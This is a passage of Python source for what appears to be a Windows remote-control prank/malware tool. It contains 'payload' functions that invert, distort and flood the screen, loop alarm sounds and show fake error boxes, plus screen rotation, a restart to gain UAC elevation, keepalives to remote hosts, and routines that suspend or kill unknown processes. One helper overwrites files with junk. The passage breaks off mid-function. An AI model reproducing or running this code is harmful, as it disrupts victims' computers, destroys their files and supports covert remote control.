#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 x_scale = self.imgis.width() / self.label.width()
#                 y_scale = self.imgis.height() / self.label.height()
#                 width = self.imgis.width()
#                 height = self.imgis.height()

#                 # Scale the mouse coordinates
#                 x = int(event.x() * x_scale)
#                 y = int(event.y() * y_scale)

#                 if event.button() == Qt.LeftButton:
#                     tlss.send_mouse_event(1, x, y, 0)
#                 elif event.button() == Qt.RightButton:
#                     tlss.send_mouse_event(1, x, y, 1)
#                 elif event.button() == Qt.MiddleButton:
#                     tlss.send_mouse_event(0, x, y, 2)

#         def mouseMoveEvent(self, event):
#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 # Calculate the scaling factor for the x and y coordinates
#                 x_scale = self.imgis.width() / self.label.width()
#                 y_scale = self.imgis.height() / self.label.height()
#                 print(self.label.pixmap().height(), self.label.height(), ' y')
#                 width = self.imgis.width()
#                 height = self.imgis.height()
#                 print(f'Image resolution: {width}x{height}')
                
#                 # Scale the mouse coordinates
#                 x = int(event.x() * x_scale)
#                 y = int(event.y() * y_scale)
                
#                 tlss.send_mouse_event(2, x, y, -1)
                
#         def wheelEvent(self, event):
#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 delta = event.angleDelta().y()
#                 print('scroll thing')
#                 # Send a scroll up or scroll down event
#                 if delta > 0:
#                     tlss.send_mouse_event(3, 0, 0, 0)
#                 else:
#                     tlss.send_mouse_event(4, 0, 0, 0)


#         def keyPressEvent(self,event ):
#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 key = QKeySequence(event.key()).toString().lower()
#                 if key == r'\udc22':
#                     key = 'win'
#                     return
#                     # cannot handle this due to limitations of the amount of letters can be sent/used in ord and cannot sent plain characters, only numbers
#                 tlss.send_key_event(5,ord(key))

#         def keyReleaseEvent(self,event ):
#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 print('released, ', QKeySequence(event.key()).toString())
#                 tlss.send_key_event(6,ord(QKeySequence(event.key()).toString()))

#         def eventFilter(self, source, event):
#             if event.type() == QtCore.QEvent.KeyPress:
#                 print('KeyPress: %s [%r]' % (event.key(), source))
#             return super().eventFilter(source, event)

#         def keyReleaseEvent(self,event ):
#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 print('released, ', QKeySequence(event.key()).toString())
#                 tlss.send_key_event(6,ord(QKeySequence(event.key()).toString()))

#         def eventFilter(self, source, event):
#             if event.type() == QtCore.QEvent.KeyPress:
#                 print('KeyPress: %s [%r]' % (event.key(), source))
#             return super().eventFilter(source, event)

#     app = QApplication(sys.argv)
#     ex = App()
#     tlss = ImageThread(ip)
#     tlss.changePixmap.connect(ex.set_image)
#     tlss.start()

#     sys.exit(app.exec_())

def play_tone(frequency, duration):
        print(f'Playing {frequency}hz for a duration of {duration}')
        winsound.Beep(frequency, duration)
        
def play_shepard_tone(start_hz, end_hz, duration):
    samples_per_second = 44100
    t = np.linspace(0, duration, int(samples_per_second * duration), False)
    f = start_hz * np.power(end_hz/start_hz, t/duration)
    wave = 0.5 * np.sin(2*np.pi*f*t)
    info = sd.query_devices()
    device_id = None
    for i, device in enumerate(info):
            if device['max_output_channels'] > 0:
                    device_id = i
                    break

    if device_id is not None:
            sd.play(wave, samples_per_second, device=device_id)
            sd.wait()
    else:
            print('No available output device found')

def payload_1(): 
        import random
        import winsound
        desk = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(0)
        y = win32api.GetSystemMetrics(1)
        for i in range(30):
                win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
                winsound.Beep(440, 50)
                win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
                winsound.Beep(220, 50)
                win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
                winsound.Beep(660, 50)
                Sleep(10)
        win32gui.ReleaseDC(desk, win32gui.GetDesktopWindow())
        win32gui.DeleteDC(desk)

def payload_2():

        x, y = GetSystemMetrics(0), GetSystemMetrics(1)
        def asidjhb():
                play_shepard_tone(100, 1000, 6)
        threading.Thread(target=asidjhb).start()
        def flash():
                for i in range(100):
                        dc = GetDC(0)
                        BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
                        DeleteDC(dc)
                        Sleep(1)
        def invert_once():
                dc = GetDC(0)
                BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
                DeleteDC(dc)
        def tunnel():
                dc = GetDC(0)
                StretchBlt(dc, 0, 0, x, y, dc, -20, -20, x+40, y+40, SRCCOPY)
                DeleteDC(dc)
        def draw_icons():
                dc = GetDC(0)
                w = None
                IconWarning = LoadIcon(w, IDI_WARNING)
                IconError = LoadIcon(w, IDI_ERROR)
                DrawIcon(dc, randrange(x), randrange(y), choice([IconError, IconWarning]))
                DrawIcon(dc, randrange(x), randrange(y), choice([IconError, IconWarning]))
                DeleteDC(dc)
        for i in range(80):
                Sleep(30)
                tunnel()
                draw_icons()
                if i % 3 == 0:
                        invert_once()

def payload_3():
    # Get the device context for the entire screen
    hdc = win32gui.GetDC(0)
    # Set the pen and brush colors to random values
    pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
    pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
    brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
    brush = win32gui.CreateSolidBrush(brush_color)
    old_pen = win32gui.SelectObject(hdc, pen)
    old_brush = win32gui.SelectObject(hdc, brush)

    # Get the screen width and height
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)

    # Continuously draw random shapes on the screen
    timeout = 8     # [seconds]
    timeout_start = time.time()

    #def play_tone_thread():
    #        play_tone(1000, 10)

    while time.time() < timeout_start + timeout:
            x = randint(0, screen_width)
            y = randint(0, screen_height)
            width = randint(10, screen_width // 10)
            height = randint(10, screen_height // 10)
            if randint(0, 1) == 0:
                    win32gui.Ellipse(hdc, x, y, x + width, y + height)
            else:
                    win32gui.Rectangle(hdc, x, y, x + width, y + height)
            pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
            brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
            brush = win32gui.CreateSolidBrush(brush_color)
            win32gui.SelectObject(hdc, pen)
            win32gui.SelectObject(hdc, brush)
            play_tone(1000, 10)
            #t = threading.Thread(target=play_tone_thread).start()
            slp(0.01)

    win32gui.SelectObject(hdc, old_pen)
    win32gui.SelectObject(hdc, old_brush)


def makethescreendorotations(duration):
        duration = int(duration)
        # Get the primary display
        screen = rotatescreen.get_primary_display()

        # Define the start position
        start_pos = screen.current_orientation

        # Create a loop to rotate the screen through 360 degrees
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
                i +=1
                # Calculate the next position
                pos = abs((start_pos - i * 90) % 360)
                # Rotate the screen to the next position
                screen.rotate_to(pos)
                # Wait for a short period before rotating again
                slp(0.7)
                
        screen.set_landscape()




def flipscreen():
        # Get the primary display
        for i in rotatescreen.get_displays():
            i.set_landscape_flipped()

def screenlandscape():
        # Get the primary display
        for i in rotatescreen.get_displays():
            i.set_landscape()

def screenportrait(): # left
        # Get the primary display
        for i in rotatescreen.get_displays():
            i.set_portrait()
            
def screenportraitflipped(): # right
        # Get the primary display
        for i in rotatescreen.get_displays():
            i.set_portrait_flipped()


def playYTvidinbackground(video_url, starttime=None, endingtime=None):
    def get_youtube_video_duration(video_url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        # Send a request to the video page
        response = requests.get(video_url, headers=headers)
        if response.status_code != 200:
            raise Exception(f"Failed to load page: {response.status_code}")

        # Parse the page content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find the script tag that contains the duration
        scripts = soup.find_all('script')

        # Search for the duration in the script tags
        for script in scripts:
            if 'ytInitialPlayerResponse' in script.string if script.string else '':
                script_content = script.string
                break
        else:
            raise Exception("Couldn't find ytInitialPlayerResponse in the page")

        # Extract the duration using a regular expression
        duration_match = re.search(r'"approxDurationMs":"(\d+)"', script_content)
        if not duration_match:
            raise Exception("Couldn't find video duration in the page")

        # Convert duration from milliseconds to seconds
        duration_ms = int(duration_match.group(1))
        duration_seconds = duration_ms / 1000

        return duration_seconds

    # Get the YouTube video URL from the user

    vid_length = math.floor(get_youtube_video_duration(video_url))

    print(f'Specified video length is: {vid_length}')

    if endingtime is not None:
        if endingtime > vid_length:
            print("ending time is more than the vid time, idk. error. don't act.. idfk")
            return False, "endingtime>vidlength"
    
    if starttime is not None:
        if starttime > vid_length:
            print("starting time is more than the vid time, idk. error. don't act.. idfk")
            return False, "starttime>vidlength"


    def tryandretryuntilwork(*args):
        def run():
            return driver.execute_script(*args)
        while True:
            try:
                return run()
            except Exception as e:
                print(e)
                time.sleep(0.5)
                continue

    def skipadbutton():
        skip_button_exists = len(driver.find_elements(By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]')) > 0

        print(f'Does the skip button exist? {skip_button_exists}')
        if skip_button_exists:
            skip_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]'))
            )
            skip_button.click()

    def getcurrentYTtime():
        return tryandretryuntilwork("return arguments[0].currentTime", video)
        # document.getElementsByTagName('video')[0].currentTime

    def play():
        tryandretryuntilwork("arguments[0].play()", video)
        print("playing...")
        # document.getElementsByTagName('video')[0].play()
    def pause():
        tryandretryuntilwork("arguments[0].pause()", video)
        print("pausing...")
        # document.getElementsByTagName('video')[0].pause()
    def detectifpause():
        return tryandretryuntilwork("return arguments[0].paused", video)
        # document.getElementsByTagName('video')[0].paused
    def detectifmuted():
        return tryandretryuntilwork("return arguments[0].muted", video)
        # document.getElementsByTagName('video')[0].muted
    def mute():
        tryandretryuntilwork("arguments[0].muted = true", video)
        print("muting...")
        # document.getElementsByTagName('video')[0].muted = true
    def unmute():
        tryandretryuntilwork("arguments[0].muted = false", video)
        print("unmuting...")
        # document.getElementsByTagName('video')[0].muted = false
        
    def setytvolume(volume): # is a one to 0
        # so if more than 100, assume wrong
        
        # this volume seems to not work, like overall, does not seem to take effect
        
        
        if volume > 1:
            volume = volume / 100
        tryandretryuntilwork("arguments[0].volume = arguments[1]", video, volume)
        print("Changing volume...")
        # document.getElementsByTagName('video')[0].volume = volume

    # Create a new instance of the Chrome driver
    # options = webdriver.ChromeOptions()
    # options.add_argument('--headless')
    # driver = webdriver.Chrome(options=options)
    webdriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
    print(f'Webdriver location: {webdriver_path}')
    # Create a new instance of the Chrome driver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)

    # Navigate to the YouTube video
    driver.get(video_url)

    # Wait until the video element is present on the page
    wait = WebDriverWait(driver, 15)
    video = wait.until(EC.presence_of_element_located((By.TAG_NAME, "video")))
    if not detectifmuted():
        mute()


    def setYTtime(time):
        tryandretryuntilwork("arguments[0].currentTime = arguments[1]", video, time)
        print("Changing playback time...")
        # document.getElementsByTagName('video')[0].currentTime = time

    # Simulate multiple types of user interactions
    def simulate_user_interaction():
        actions = ActionChains(driver)
        
        # Click on the body
        actions.move_to_element(driver.find_element(By.TAG_NAME, 'body')).click().perform()
        time.sleep(1)
        
        # Click on the video element
        actions.move_to_element(video).click().perform()
        time.sleep(1)
        
        # Send a key press event
        actions.send_keys(Keys.SPACE).perform()
        time.sleep(1)

    if not detectifmuted():
        mute()
    # Perform user interaction to enable autoplay
    simulate_user_interaction()
    if not detectifmuted():
        mute()
    wait3sec = time.time() + 3

    while True:
        try:
            video = driver.find_element(By.TAG_NAME, "video")
            skipadbutton()
            if not detectifmuted(): # aka if not muted
                mute()
                
            end_time = math.floor(tryandretryuntilwork("return arguments[0].duration", video))
            print("End time:", end_time)
            
            if detectifpause():
                play()
            
            if end_time != vid_length:
                wait3sec = time.time() + 3
                tryandretryuntilwork("arguments[0].currentTime = arguments[0].duration - 0.2", video)
                print("ad detected, skipping...")
            elif time.time() > wait3sec:
                print("no ad detected, continuing...")
                tryandretryuntilwork("arguments[0].currentTime = 0", video)
                break
        except selenium.common.exceptions.StaleElementReferenceException:
            print("Stale element reference exception occurred. Trying to find the video element again.")
            continue
        
        time.sleep(1)

    while detectifpause():
        play()
        time.sleep(0.8)

    setytvolume(1) 
    print('skipped all ads, or there were just no ads.. ')
    if detectifmuted(): # aka, it detects if it is muted, if it is, it's a True. otherwise false, so you unmute
        unmute()

    if starttime is not None:
        setYTtime(starttime)
    else:
        setYTtime(0)
    
    if endingtime is not None:
        while getcurrentYTtime() < endingtime:
            time.sleep(0.1)
            print(getcurrentYTtime())
    
    if endingtime is None:
        # wait until vid reaches the end
        while getcurrentYTtime() < end_time - 2.5: # -0.5 to account for the slight delay in the video ending
            time.sleep(1)
        
    
    driver.quit() # since it cleans up, it'll take a little bit until it returns back to the callable

def payload_4():
        # Get the device context for the entire screen
        hdc = win32gui.GetDC(0)

        # Get the screen width and height
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)

        timeout = 60     # [seconds]
        min_interval = 3     # [seconds]
        max_interval = 7     # [seconds]

        timeout_start = time.time()

        while time.time() < timeout_start + timeout:
                # Stretch and compress the screen randomly
                x1 = randint(0, screen_width)
                y1 = randint(0, screen_height)
                x2 = randint(0, screen_width)
                y2 = randint(0, screen_height)
                w1 = randint(1, screen_width)
                h1 = randint(1, screen_height)
                w2 = randint(1, screen_width)
                h2 = randint(1, screen_height)
                win32gui.StretchBlt(hdc, x1, y1, w1, h1, hdc, x2, y2, w2, h2, win32con.SRCCOPY)

                # Fill the entire screen with a random color
                interval = randint(min_interval, max_interval)
                color = choice([(255, 0, 0), (0, 255, 0), (0, 0, 255), (127, 127, 127), (255, 127, 0)])
                brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
                win32gui.FillRect(hdc, (0, 0, screen_width, screen_height), brush)
                play_tone(100, 100)
                play_shepard_tone(10, 100, 1)
                play_tone(1000, 10)
                time.sleep(interval)


def payload_5():
        timeout = 7     # [seconds]
        
        def amtxuif():
                MessageBox = ctypes.windll.user32.MessageBoxW
                MessageBox(None, "An error has occurred", "Error", 0x40 | 0x1)

        threading.Thread(target=amtxuif).start()
        
        def awhiletrue():
                while True:
                        winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
                        slp(1.3)
        def bwhiletrue():
                while True:
                        winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
                        slp(0.04)
        def abcd():
                threading.Thread(target=awhiletrue).start()
                slp(0.5)
                threading.Thread(target=bwhiletrue).start()

        timeout_start = time.time()
        abcd()
        while time.time() < timeout_start + timeout:
                pass
        # print('Trigger!, Force crashing b\\c of payload 5.')
        # crashOOPS()
        # crashOOPS()
        # crashOOPS()

def payload_6():
        # Get the device context for the entire screen
        hdc = win32gui.GetDC(0)

        # Get the screen width and height
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)

        timeout = 10     # [seconds]

        timeout_start = time.time()

        while time.time() < timeout_start + timeout:
                win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.NOTSRCCOPY)
                # Display a grayscale version of the screen
                gray_dc = win32gui.CreateCompatibleDC(hdc)
                bitmap = win32gui.CreateCompatibleBitmap(hdc, screen_width, screen_height)
                win32gui.SelectObject(gray_dc, bitmap)
                win32gui.BitBlt(gray_dc, 0, 0, screen_width, screen_height, hdc, 0, 0, win32con.SRCCOPY)
                brush = win32gui.CreateSolidBrush(0)
                win32gui.FillRect(gray_dc, (0, 0, screen_width, screen_height), brush)
                win32gui.BitBlt(hdc, 0, 0, screen_width, screen_height, gray_dc, 0, 0, win32con.SRCCOPY)
                win32gui.DeleteDC(gray_dc)

def restartToUAC():
    if admin_privileges == False:
        print('Restarting to obtain UAC perms')
        programVL2(f'start {os.path.join(get_script_directory(), get_script_filename())}')
        kill_self()
    else:
        print('Already have UAC perms, no need in a restart')

# make a time out system and a keep alive, make the timeout be like 2 minutes and keep alive every 1m. make it so that if you receive a keep alive you have reset the timeout counter.
def keepalive():
    global timeout_device_list, varyhosts
    while True:
        currentTime = time.time()
        # print(varyhosts, " len", len(varyhosts))
        if len(varyhosts) == 0:
            slp(1)
            pass
        else:
            for hostAddr in varyhosts:
                if hostAddr in timeout_device_list.keys():
                    print("IS ")
                    if timeout_device_list[hostAddr] > currentTime:
                        print('b', (timeout_device_list[hostAddr] + 60) > (currentTime), " time;", timeout_device_list[hostAddr], " cur:", currentTime) 
                        if (timeout_device_list[hostAddr] + 60) > (currentTime):
                            print('c')
                            print(f'Device timed out: ', hostAddr)
                            print('d')
                            varyhosts.remove(hostAddr)
                            del timeout_device_list[hostAddr]
                            # timeout_device_list.remove(hostAddr)
                            print('t')
                        else:
                            print('eas')
                            send(hostAddr, "Keepalive")
                            print('donase')
                            print('sent keep alive to', hostAddr)
                            print('sbnd')
                else:
                    # timeout_device_list.append(hostAddr)
                    print('adding to list,', hostAddr)
                    timeout_device_list[hostAddr] = time.time() + 60*1
            print('keepalive to do,', timeout_device_list)
            slp(25) # make a version of each 10 or 30+ minutes it'll scan the whole network, slowly 

def freeze_unknown_processes(): # you can use unfreeze all to unfreeze these

    print(f'Initiating freeze unknown process')
    # a list to kill processes when got all. # PID ONLY!
    tokill = []

    # to not absolutely kill windows there shall be an exclude list, but this program is(sort of) foolproof.
    exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']
    exclude_list = [x.lower() for x in exclude_list]
    # ['System', '', 'Registry', 'LsaIso.exe', 'RuntimeBroker.exe', 'TrustedInstaller.exe', 'MemCompression', 'wlms.exe', 'sqlwriter.exe', 'MsMpEng.exe', 'AggregatorHost.exe', 'RuntimeBroker.exe', 'manage-bde.exe', 'WindowsTerminal.exe', 'MpCmdRun.exe', 'userinit.exe', 'OpenConsole.exe', 'RuntimeBroker.exe', 'dllhost.exe', 'Widgets.exe', 'SearchHost.exe', 'StartMenuExperienceHost.exe', 'dllhost.exe', 'dllhost.exe', 'NisSrv.exe', 'MpCmdRun.exe', 'WmiPrvSE.exe', 'dllhost.exe', 'mobsync.exe', 'findstr.exe', 'WmiPrvSE.exe']

    exclude_list_HAVE = ["System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    
    
    exclude_list_HAVE = exclude_list_HAVE + exclude_list
    
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()


    def getchildrenofprocess(pid):
            process = psutil.Process(pid)
            for child in process.children(recursive=True):
                    add(child.pid)
                    
    #        f.write(f"Process {pid} was killed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())
    def add(pid, children=False):
            if pid == ownprogrampid or pid == ownprogramparrentpid:
                    # to not kill self.
                    pass
            else:
                    if children == True:
                            getchildrenofprocess(pid)
                    if pid not in tokill:
                            tokill.append(pid)

    processes = psutil.process_iter()
    # system32_files = os.listdir(os.environ['WINDIR'] + '\System32')
    # system32_files = [x.lower() for x in system32_files]
    # windows_files = os.listdir(os.environ['WINDIR'])
    # windows_files = [x.lower() for x in windows_files]
    
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    # Iterate through the list of processes
    for process in processes:
        try:
            # Get the process ID, name, and executable path
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.lower().replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.lower().replace('\\', '/').replace('//', '/'):
                continue
            else:
    
                    # Check if the process name is in the System32 file list and if the executable path is not in the System32 folder
                    # print(f'Comperison of {name} PATH: {exe_path} equal?: ', name, ' to: ', tmpnamefilenameself.lower(), ' path: ', exe_path.lower().replace("\\", "/").replace("//", "/"), '  to: ', a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/"))
                    if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                            pass
                    else:
                        if name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                                pass
                        else:
                                #print(f'Comperison of {name} {exe_path}, Is the name from System32? {name in system32_files}, Is the name from Windows folder? {name in windows_files}')
                            if pid not in lsttocheck:
                                # print(f'{psutil.Process(pid).name()} @ {psutil.Process(pid).exe()} is being added to the list, equal?', (name == tmpnamefilenameself.lower() and exe_path.lower().replace("\\", "/").replace("//", "/") == a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/")))
                                add(pid)
        except Exception as e:
                # print(f'Error: {e}')
                pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia in exclude_list_HAVE:
            pass
        else:   
            newlisttokill.append(i)
    tokill = newlisttokill      
    
    # save locations.
    pid_locations = []
    for pid in tokill:
        try:
            pid_locations.append(psutil.Process(pid).exe())
        except Exception as e:
            #print(f'Error: {e}')
            continue
    # Kill all the processes in the list of processes to kill
    
    # filter tokill list from exclude_list_have
    
         
    
    #name_pid_list = [psutil.Process(pid).name() for pid in tokill]
    #print(name_pid_list)
    #sleep(4)    

    # print('initiating the to-kill in terminate unknown processes!')
    self = os.path.join(get_script_directory(), get_script_filename()).lower().replace('\\', '/')
    for pid in tokill:
        if pid == ownpid:
            continue
        if pid in lsttocheck:
            continue
        else:
            try:
                proc = psutil.Process(pid)
                if len(proc.cmdline()) > 1:
                    vrsproc = proc.cmdline()[1]
                else:
                    vrsproc = proc.cmdline()[0]
                
                # print(f'Name: {proc.name()}, equal to self {proc.name().casefold() == get_script_filename().casefold()}, location equal: {proc.name().casefold() == get_script_filename().casefold()}')
                if proc.name().casefold() == tmpnamefilenameself.casefold() and self.casefold() == vrsproc.lower().replace('\\', '/').casefold():
                    continue
                else:
                    # print(f'{psutil.Process(pid).name()} @ {psutil.Process(pid).exe()} is being killed, equal?', (name == tmpnamefilenameself.lower() and exe_path.lower().replace("\\", "/").replace("//", "/") == a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/")))
                    # slp(1)
                    # runcmd('taskkill /f /im ' + psutil.Process(pid).name())
                    psutil.Process(pid).suspend()
            except Exception as e:
                #print(f'Error: {e}') 
                pass




    



def terminate_unknown_processes(corrupt=True):
    '''
    Clean out all the windows and running processes.
    '''

    print(f'Initiating a terminate unknown process')
    # a list to kill processes when got all. # PID ONLY!
    tokill = []

    # to not absolutely kill windows there shall be an exclude list, but this program is(sort of) foolproof.
    exclude_list = ["powershell.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe","explorer.exe","svchost.exe","services.exe","csrss.exe","winlogon.exe","lsass.exe","lsm.exe","smss.exe","system","wininit.exe","taskmgr.exe","winmgmt.exe","ntoskrnl.exe","spoolsv.exe","msdtc.exe","audiodg.exe","dwm.exe","searchindexer.exe", "whatsapp.exe", 'System', 'SecurityHealthService.exe', 'MemCompression', 'csrss.exe', 'MpCmdRun.exe', 'WUDFHost.exe', 'TiWorker.exe', 'smss.exe', 'VSSVC.exe', 'lsass.exe', 'sihost.exe', 'WmiPrvSE.exe', 'ctfmon.exe', 'SearchFilterHost.exe', 'winlogon.exe', 'rdpclip.exe', 'taskhostw.exe', 'ngen.exe', 'sppsvc.exe', 'backgroundTaskHost.exe', 'wlms.exe', 'TextInputHost.exe', 'LogonUI.exe', 'svchost.exe', 'smartscreen.exe', 'SearchApp.exe', 'dwm.exe', 'taskkill.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'mscorsvw.exe', 'System Idle Process', 'conhost.exe', 'ngentask.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe', 'OneDrive.exe', 'spoolsv.exe', 'explorer.exe', 'SecurityHealthSystray.exe', 'System', 'services.exe']
    exclude_list = [x.lower() for x in exclude_list]
    # ['System', '', 'Registry', 'LsaIso.exe', 'RuntimeBroker.exe', 'TrustedInstaller.exe', 'MemCompression', 'wlms.exe', 'sqlwriter.exe', 'MsMpEng.exe', 'AggregatorHost.exe', 'RuntimeBroker.exe', 'manage-bde.exe', 'WindowsTerminal.exe', 'MpCmdRun.exe', 'userinit.exe', 'OpenConsole.exe', 'RuntimeBroker.exe', 'dllhost.exe', 'Widgets.exe', 'SearchHost.exe', 'StartMenuExperienceHost.exe', 'dllhost.exe', 'dllhost.exe', 'NisSrv.exe', 'MpCmdRun.exe', 'WmiPrvSE.exe', 'dllhost.exe', 'mobsync.exe', 'findstr.exe', 'WmiPrvSE.exe']

    exclude_list_HAVE = ["System", "WindowsTerminal.exe", "OpenConsole.exe", "chrome.exe", "MemCompression", "GoogleUpdate.exe", "WINWORD.EXE","POWERPNT.EXE","GoogleCrashHandler.exe","GoogleCrashHandler64.exe", "wlms.exe"]
    exclude_list_HAVE = [x.lower() for x in exclude_list_HAVE]
    
    ownprogrampid = os.getpid()
    ownprogramparrentpid = os.getppid()

    # Functions:
    def corruptfile(directoryoffile):
        with open(directoryoffile, "w+") as f:
            f.seek(0)
            content = f.read()
            scrubbed_content = b"X" * len(content)
            f.seek(0)
            f.write(scrubbed_content)
            f.truncate()

    def getchildrenofprocess(pid):
            process = psutil.Process(pid)
            for child in process.children(recursive=True):
                    add(child.pid)
                    
    #        f.write(f"Process {pid} was killed at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    ownpid = os.getpid()
    lsttocheck = get_process_connected_pids(os.getppid())
    def add(pid, children=False):
            if pid == ownprogrampid or pid == ownprogramparrentpid:
                    # to not kill self.
                    pass
            else:
                    if children == True:
                            getchildrenofprocess(pid)
                    if pid not in tokill:
                            tokill.append(pid)

    processes = psutil.process_iter()
    # system32_files = os.listdir(os.environ['WINDIR'] + '\System32')
    # system32_files = [x.lower() for x in system32_files]
    # windows_files = os.listdir(os.environ['WINDIR'])
    # windows_files = [x.lower() for x in windows_files]
    
    a1tmpnamedirectoryself = os.path.join(get_script_directory(), get_script_filename()) 
    tmpnamefilenameself = get_script_filename()
    # Iterate through the list of processes
    for process in processes:
        try:
            # Get the process ID, name, and executable path
            pid = process.pid
            name = process.name().lower()
            exe_path = process.exe().lower()
            if name == tmpnamefilenameself.lower() and exe_path.lower().replace('\\', '/').replace('//', '/') == a1tmpnamedirectoryself.lower().replace('\\', '/').replace('//', '/'):
                continue
            else:
    
                    # Check if the process name is in the System32 file list and if the executable path is not in the System32 folder
                    # print(f'Comperison of {name} PATH: {exe_path} equal?: ', name, ' to: ', tmpnamefilenameself.lower(), ' path: ', exe_path.lower().replace("\\", "/").replace("//", "/"), '  to: ', a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/"))
                    if name in system32_files and exe_path.startswith((os.environ['WINDIR'] + '\\System32').lower()):
                            pass
                    else:
                        if name in windows_files and exe_path.startswith((os.environ['WINDIR']).lower()):
                                pass
                        else:
                                #print(f'Comperison of {name} {exe_path}, Is the name from System32? {name in system32_files}, Is the name from Windows folder? {name in windows_files}')
                            if pid not in lsttocheck:
                                # print(f'{psutil.Process(pid).name()} @ {psutil.Process(pid).exe()} is being added to the list, equal?', (name == tmpnamefilenameself.lower() and exe_path.lower().replace("\\", "/").replace("//", "/") == a1tmpnamedirectoryself.lower().replace("\\", "/").replace("//", "/")))
                                add(pid)
        except Exception as e:
                # print(f'Error: {e}')
                pass

    newlisttokill = []
    for i in tokill:
        ia  = psutil.Process(i).name().lower()
        if ia in exclude_list_HAVE:
            pass
        else:   
            newlisttokill.append(i)
    tokill = newlisttokill      
    
    # save locations.
    pid_locations = []
    for pid in tokill:
        try:
